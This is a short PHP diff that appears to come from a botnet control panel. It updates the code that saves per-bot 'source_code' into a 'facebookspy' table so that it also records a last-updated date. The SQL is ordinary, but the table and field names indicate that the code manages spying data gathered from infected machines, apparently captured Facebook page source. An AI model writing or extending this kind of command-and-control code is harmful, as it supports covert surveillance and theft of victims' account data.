@@ -121,16 +121,19 @@ elseif(isset($_POST['add_source_spy']) && $_POST['add_source_spy'] != '' && isse
         $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :id");
         $select->bindParam(':id', $ids);
         $select->execute();
+        $date_last = date('d-m-Y');
         if($select->rowCount() > 0){
-            $update = $bdd->prepare("UPDATE facebookspy SET source_code = :source_code WHERE bot_id = :bot_id");
+            $update = $bdd->prepare("UPDATE facebookspy SET source_code = :source_code,date_last = :date_last WHERE bot_id = :bot_id");
             $update->bindParam(':source_code', $_POST['add_source_spy']);
             $update->bindParam(':bot_id', $ids);
+            $update->bindParam(':date_last', $date_last);
             $update->execute();
         }
         else{
-            $insert = $bdd->prepare("INSERT INTO facebookspy(bot_id,source_code) VALUES(:bot_id, :source_code)");
+            $insert = $bdd->prepare("INSERT INTO facebookspy(bot_id,source_code,date_last) VALUES(:bot_id, :source_code,:date_last)");
             $insert->bindParam(':bot_id', $ids);
             $insert->bindParam(':source_code', $_POST['add_source_spy']);
+            $insert->bindParam(':date_last', $date_last);
             $insert->execute();
         }
     }
